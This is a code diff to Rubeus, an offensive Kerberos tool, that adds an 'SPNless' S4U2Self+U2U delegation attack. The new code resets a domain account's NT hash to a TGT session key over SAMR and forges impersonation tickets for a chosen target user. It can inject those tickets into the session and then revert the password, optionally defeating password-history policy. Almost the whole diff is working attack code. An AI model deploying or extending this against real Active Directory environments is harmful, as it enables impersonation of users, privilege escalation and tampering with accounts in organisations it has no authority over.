@@ -2,7 +2,7 @@
 using Rubeus.Commands;
 using Rubeus.lib.Interop;
 using System;
-using System.Diagnostics;
+
 using System.DirectoryServices.ActiveDirectory;
 using System.Net;
 using System.Net.Sockets;
@@ -13,7 +13,7 @@ namespace Rubeus
 {
     public class S4U
     {
-        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true, string proxyUrl = null, string createnetonly = null, bool show = false)
+        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true, string proxyUrl = null, string createnetonly = null, bool show = false, bool spnless = false, bool sspi = false, bool revertPass = false, bool bypassHistory = false)
         {
             // first retrieve a TGT for the user
             byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec, "", false, pac, proxyUrl);
@@ -32,47 +32,122 @@ namespace Rubeus
             KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
 
             // execute the s4u process
-            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype, null, null, proxyUrl, createnetonly, show);
+            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype, null, null, proxyUrl, createnetonly, show, spnless, sspi, revertPass, bypassHistory);
         }
 
-        static void ChangePassword(string identity, string dcIp, string newHash, string oldPass = null, string oldHash = null)
+        static void ChangePassword(string identity, string dcIp, string newHash, string oldPass = null, string oldHash = null, bool sspi = false)
         {
-            string scriptPath = @"C:\Users\Administrator\Desktop\getSPNless-main\changepasswd_cli.py";
-
-            string args = $"python \"{scriptPath}\" {identity} -dc-ip {dcIp} -newhash {newHash}";
-
-            if (!string.IsNullOrEmpty(oldPass))
-                args += $" -old-pass {oldPass}";
-            else if (!string.IsNullOrEmpty(oldHash))
-                args += $" -hashes :{oldHash}";
-
-            ProcessStartInfo psi = new ProcessStartInfo
+            using (var session = OpenPasswordSession(identity, dcIp, newHash, oldPass, oldHash, sspi))
             {
-                FileName = "cmd.exe",
-                Arguments = $"/c {args}",
-                UseShellExecute = false,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true
-            };
-
-            using (Process proc = Process.Start(psi))
-            {
-                Console.WriteLine(proc.StandardOutput.ReadToEnd());
-                Console.WriteLine(proc.StandardError.ReadToEnd());
-                proc.WaitForExit();
             }
         }
 
-        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "", string proxyUrl = null, string createnetonly = null, bool show = false)
+        static void RevertPassword(Smb.SamrSession samrSession, string currentHashHex, string originalHashHex, string domain, string userName, bool revertPass = false, bool bypassHistory = false)
+        {
+            if (samrSession == null) return;
+
+            if (!revertPass)
+            {
+                Console.WriteLine("[*] Password was changed to: {0}", currentHashHex);
+                Console.WriteLine("[*] Use /revertpass to automatically revert, or /revertpass /bypasshistory to flush password history first");
+                Console.WriteLine("[*] Manual revert: Rubeus.exe samrchangepw /dc:<dc> /domain:{0} /user:{1} /old:{2} /new:{3}", domain, userName, currentHashHex, originalHashHex);
+                samrSession.Dispose();
+                return;
+            }
+
+            byte[] currentHash = Helpers.StringToByteArray(currentHashHex);
+            byte[] originalHash = Helpers.StringToByteArray(originalHashHex);
+            try
+            {
+                if (bypassHistory)
+                {
+                    Console.WriteLine("[*] Flushing password history and reverting to original hash");
+                    samrSession.ChangePasswordFlushHistory(currentHash, originalHash);
+                    Console.WriteLine("[+] Password reverted successfully");
+                }
+                else
+                {
+                    Console.WriteLine("[*] Reverting password to original hash");
+                    samrSession.ChangePassword(currentHash, originalHash);
+                    Console.WriteLine("[+] Password reverted successfully");
+                }
+            }
+            catch (Exception ex)
+            {
+                if (ex.Message.Contains("0xC000006C") && !bypassHistory)
+                {
+                    Console.WriteLine("[!] Revert blocked by password history policy");
+                    Console.WriteLine("[!] Re-run with /revertpass /bypasshistory to flush the history (24 dummy password changes)");
+                    Console.WriteLine("[!] Manual revert: Rubeus.exe samrchangepw /dc:<dc> /domain:{0} /user:{1} /old:{2} /new:{3}", domain, userName, currentHashHex, originalHashHex);
+                }
+                else
+                {
+                    Console.WriteLine("[X] Failed to revert password: {0}", ex.Message);
+                }
+            }
+            finally
+            {
+                samrSession.Dispose();
+            }
+        }
+
+        static Smb.SamrSession OpenPasswordSession(string identity, string dcIp, string newHash, string oldPass = null, string oldHash = null, bool sspi = false)
+        {
+            string[] parts = identity.Split('/');
+            string domain = parts[0];
+            string username = parts[1];
+
+            byte[] newNtHash = Helpers.StringToByteArray(newHash);
+            byte[] oldNtHash;
+
+            if (!string.IsNullOrEmpty(oldHash))
+            {
+                oldNtHash = Helpers.StringToByteArray(oldHash);
+            }
+            else if (!string.IsNullOrEmpty(oldPass))
+            {
+                string hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, oldPass);
+                oldNtHash = Helpers.StringToByteArray(hash);
+            }
+            else
+            {
+                Console.WriteLine("[X] Either oldHash or oldPass must be provided for ChangePassword");
+                return null;
+            }
+
+            if (sspi)
+            {
+                Smb.SamrPasswordChange.ChangeNtHashLocal(dcIp, domain, username, oldNtHash, newNtHash);
+                return null;
+            }
+            else
+            {
+                var session = Smb.SamrPasswordChange.OpenSamrSession(dcIp, domain, username, oldNtHash);
+                session.ChangePassword(oldNtHash, newNtHash);
+                Console.WriteLine("[+] Password changed");
+                return session;
+            }
+        }
+
+        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "", string proxyUrl = null, string createnetonly = null, bool show = false, bool spnless = false, bool sspi = false, bool revertPass = false, bool bypassHistory = false)
         {
             Console.WriteLine("[*] Action: S4U\r\n");
 
-            if (!String.IsNullOrEmpty(targetDomain) && !String.IsNullOrEmpty(targetDomainController))
+            if (spnless && !String.IsNullOrEmpty(targetDomain) && !String.IsNullOrEmpty(targetDomainController))
+            {
+                Console.WriteLine("[*] Performing cross-domain SPNless (S4U2Self+U2U)");
+                CrossDomainS4U_U2U(kirbi, targetUser, targetSPN, ptt, domainController, altService, targetDomainController, targetDomain, createnetonly, show, rc4: keyString, revertPass: revertPass, bypassHistory: bypassHistory);
+            }
+            else if (spnless)
+            {
+                S4U_U2U(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, createnetonly, show, rc4: keyString, sspi: sspi, revertPass: revertPass, bypassHistory: bypassHistory);
+            }
+            else if (!String.IsNullOrEmpty(targetDomain) && !String.IsNullOrEmpty(targetDomainController))
             {
                 // do cross domain S4U
                 // no support for supplying a TGS due to requiring more than a single ticket
                 Console.WriteLine("[*] Performing cross domain constrained delegation");
-                CrossDomainS4U_U2U(kirbi, targetUser, targetSPN, ptt, domainController, altService, targetDomainController, targetDomain, createnetonly, show, rc4:keyString);
+                CrossDomainS4U_U2U(kirbi, targetUser, targetSPN, ptt, domainController, altService, targetDomainController, targetDomain, createnetonly, show, rc4: keyString, revertPass: revertPass, bypassHistory: bypassHistory);
             }
             else
             {
@@ -161,9 +236,10 @@ namespace Rubeus
             }
 
             // supported encryption types
-            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
             s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
-            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
+            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
+            if (etype != Interop.KERB_ETYPE.aes256_cts_hmac_sha1 && etype != Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
+                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
 
             // add in the ticket from the S4U2self response
             s4u2proxyReq.req_body.additional_tickets.Add(tgs.tickets[0]);
@@ -184,8 +260,11 @@ namespace Rubeus
                 s4u2proxyReq.req_body.till = till;
 
                 // extra etypes
-                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);
-                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);
+                if (etype != Interop.KERB_ETYPE.aes256_cts_hmac_sha1 && etype != Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
+                {
+                    s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);
+                    s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);
+                }
 
                 // get hostname and hostname of SPN
                 string hostName = Dns.GetHostName().ToUpperInvariant();
@@ -285,23 +364,6 @@ namespace Rubeus
                         // now build the final KRB-CRED structure with one or more alternate snames
                         KRB_CRED cred = new KRB_CRED();
 
-                        // Check if the hostname part (index 1) contains a port (like :1433) and clean it
-                        if (rep2.ticket.sname.name_string.Count > 1 && rep2.ticket.sname.name_string[1].Contains(":"))
-                        {
-                            string rawHostname = rep2.ticket.sname.name_string[1];
-                            string cleanHostname = rawHostname.Split(':')[0];
-                            rep2.ticket.sname.name_string[1] = cleanHostname;
-
-
-                            if (encRepPart2.sname.name_string.Count > 1)
-                            {
-                                encRepPart2.sname.name_string[1] = cleanHostname;
-                            }
-                            Console.WriteLine("[!] Cleaned The port from hostname: {0} -> {1}", rawHostname, cleanHostname);
-
-
-                            serverName = cleanHostname;
-                        }
                         // since we want an alternate sname, first substitute it into the ticket structure
                         rep2.ticket.sname.name_string[0] = altSname;
 
@@ -726,7 +788,7 @@ namespace Rubeus
             }
         }
 
-        private static void CrossDomainS4U_U2U(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", string targetDomainController = "", string targetDomain = "", string createnetonly = null, bool show = false, string rc4 = null)
+        private static void CrossDomainS4U_U2U(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", string targetDomainController = "", string targetDomain = "", string createnetonly = null, bool show = false, string rc4 = null, bool revertPass = false, bool bypassHistory = false)
         {
 
             // extract out the info needed for the TGS-REQ/S4U2Self execution
@@ -739,13 +801,14 @@ namespace Rubeus
             string clientKeyHex = BitConverter.ToString(OriginalLocalTGT_clientKey).Replace("-", "").ToLower();
 
 
-            ChangePassword(
-                identity: "SECOND/omritest",
-                dcIp: "127.0.0.1",
-                newHash: clientKeyHex, // Hex of the client key,kirbi is the real initial TGT
-                oldHash: rc4 // Original User Password 
+            string changePwDcIp = Networking.GetDCIP(domainController);
+            Console.WriteLine("[*] Changing password to TGT session key: {0}", clientKeyHex);
+            var samrSession = OpenPasswordSession(
+                identity: domain + "/" + userName,
+                dcIp: changePwDcIp,
+                newHash: clientKeyHex,
+                oldHash: rc4
             );
-
 
             // user variables
             string user = string.Format("{0}@{1}", userName, domain);
@@ -792,10 +855,131 @@ namespace Rubeus
                 KRB_CRED foreignS4U2Proxy = CrossDomainS4U2Proxy(user, target, targetSPN, targetDomainController, crossTGS.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial, localS4U2Proxy.tickets[0], true, ptt);
             }
 
-
+            RevertPassword(samrSession, clientKeyHex, rc4, domain, userName, revertPass, bypassHistory);
         }
+
+        private static void S4U_U2U(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", string createnetonly = null, bool show = false, string rc4 = null, bool sspi = false, bool revertPass = false, bool bypassHistory = false)
+        {
+            Console.WriteLine("[*] Performing single-domain SPNless (S4U2Self+U2U)\r\n");
+
+            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
+            string domain = kirbi.enc_part.ticket_info[0].prealm;
+            Ticket originalTGT = kirbi.tickets[0];
+            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
+            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
+
+            string clientKeyHex = BitConverter.ToString(clientKey).Replace("-", "").ToLower();
+
+            // Step 1: Change the user's password to the TGT session key
+            string dcIp = Networking.GetDCIP(domainController);
+            if (String.IsNullOrEmpty(dcIp)) return;
+
+            Console.WriteLine("[*] Changing password to TGT session key: {0}", clientKeyHex);
+            var samrSession = OpenPasswordSession(
+                identity: domain + "/" + userName,
+                dcIp: dcIp,
+                newHash: clientKeyHex,
+                oldHash: rc4,
+                sspi: sspi
+            );
+
+            // Step 2: S4U2Self with U2U — request from our own DC
+            string user = string.Format("{0}@{1}", userName, domain);
+            string target = string.Format("{0}@{1}", targetUser, domain);
+
+            Console.WriteLine("[*] Building S4U2Self+U2U request for '{0}' from {1}", targetUser, domain);
+            byte[] tgsBytes = TGS_REQ.NewTGSReq(user, target, originalTGT, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, cross: false, U2U_ENC: true, AdditionalTicket: originalTGT);
+
+            Console.WriteLine("[*] Sending S4U2Self+U2U request to {0}:88", dcIp);
+            byte[] response = Networking.SendBytes(dcIp, 88, tgsBytes);
+            if (response == null) return;
+
+            AsnElt responseAsn = AsnElt.Decode(response, false);
+            int responseTag = responseAsn.TagValue;
+
+            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
+            {
+                Console.WriteLine("[+] S4U2Self+U2U success!");
+
+                TGS_REP rep = new TGS_REP(responseAsn);
+                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
+                AsnElt ae = AsnElt.Decode(outBytes, false);
+                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
+
+                KRB_CRED cred = new KRB_CRED();
+
+                if (!String.IsNullOrEmpty(altService))
+                {
+                    rep.ticket.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
+                    rep.ticket.sname.name_string[0] = altService.Split('/')[0];
+                    rep.ticket.sname.name_string.Add(altService.Split('/')[1]);
+                }
+
+                cred.tickets.Add(rep.ticket);
+
+                KrbCredInfo info = new KrbCredInfo();
+
+                info.key.keytype = encRepPart.key.keytype;
+                info.key.keyvalue = encRepPart.key.keyvalue;
+
+                info.prealm = encRepPart.realm;
+
+                info.pname.name_type = rep.cname.name_type;
+                info.pname.name_string = rep.cname.name_string;
+
+                info.flags = encRepPart.flags;
+
+                info.starttime = encRepPart.starttime;
+                info.endtime = encRepPart.endtime;
+                info.renew_till = encRepPart.renew_till;
+
+                info.srealm = encRepPart.realm;
+
+                info.sname.name_type = encRepPart.sname.name_type;
+                info.sname.name_string = encRepPart.sname.name_string;
+
+                if (!String.IsNullOrEmpty(altService))
+                {
+                    Console.WriteLine("[*] Substituting alternative service name '{0}'", altService);
+                    info.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
+                    info.sname.name_string[0] = altService.Split('/')[0];
+                    info.sname.name_string.Add(altService.Split('/')[1]);
+                }
+
+                cred.enc_part.ticket_info.Add(info);
+
+                byte[] kirbiBytes = cred.Encode().Encode();
+                PrintTicket(kirbiBytes, "base64(ticket.kirbi)");
+
+                KRB_CRED selfTicket = new KRB_CRED(kirbiBytes);
+
+                if (ptt && String.IsNullOrEmpty(targetSPN))
+                {
+                    ImportTicket(kirbiBytes, createnetonly, show);
+                }
+
+                // Step 3: S4U2Proxy if targetSPN provided
+                if (!String.IsNullOrEmpty(targetSPN))
+                {
+                    S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, selfTicket, false, null, createnetonly, show);
+                }
+
+            }
+            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
+            {
+                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
+                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+            }
+            else
+            {
+                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
+            }
+
+            RevertPassword(samrSession, clientKeyHex, rc4, domain, userName, revertPass, bypassHistory);
+        }
+
         private static KRB_CRED CrossDomainS4U2Self_U2U(string userName, string targetUser, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, bool cross = true, Ticket AdditionlTicket = null, string altService = "", bool self = false, string requestDomain = "", bool ptt = false, string createnetonly = null, bool show = false)
-        { 
+        {
             // die if can't get IP of DC
             string dcIP = Networking.GetDCIP(targetDomainController);
             if (String.IsNullOrEmpty(dcIP)) { return null; }
@@ -1081,9 +1265,10 @@ namespace Rubeus
             }
 
             // supported encryption types
-            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
             s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
-            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
+            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
+            if (etype != Interop.KERB_ETYPE.aes256_cts_hmac_sha1 && etype != Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
+                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
 
             // add in the ticket from the S4U2self response
             s4u2proxyReq.req_body.additional_tickets.Add(tgs);
